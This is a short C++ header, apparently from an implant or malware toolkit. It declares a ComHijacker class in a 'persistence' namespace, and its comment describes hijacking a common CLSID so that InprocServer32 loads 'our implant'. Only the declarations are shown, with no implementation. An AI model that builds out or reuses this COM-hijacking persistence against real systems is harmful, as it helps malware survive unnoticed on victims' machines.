#pragma once
#include <windows.h>
#include <string>

namespace persistence {

class ComHijacker {
public:
    // Hijacks a common CLSID (e.g., Folder Background Menu or similar) 
    // to point InprocServer32 to our implant.
    static bool Install(const std::string& implantPath, const std::string& clsid);

    static bool Uninstall(const std::string& clsid);
};

} // namespace persistence
